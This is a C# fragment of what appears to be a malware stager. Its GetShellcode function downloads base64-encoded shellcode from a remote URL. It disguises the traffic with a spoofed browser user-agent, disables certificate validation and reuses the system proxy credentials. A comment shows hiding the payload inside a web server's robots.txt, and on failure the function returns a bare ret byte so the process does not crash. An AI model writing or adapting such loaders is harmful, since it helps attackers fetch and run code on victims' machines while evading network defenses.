// base64 -w 0 payload.bin > /var/www/html/robots.txt
public static byte[] GetShellcode(string url)
{
    try
    {
        // fuck ciphers
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
        WebClient client = new WebClient();
        // hood up
        client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
        // yeah yeah
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        client.Proxy = WebRequest.GetSystemWebProxy();
        client.Proxy.Credentials = CredentialCache.DefaultCredentials;
        string compressedEncodedShellcode = client.DownloadString(url);
        return Convert.FromBase64String(compressedEncodedShellcode);
    }
    catch (Exception e)
    {
        Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace);
        var ret = new byte[] { 0xC3 };
        return ret;
    }
}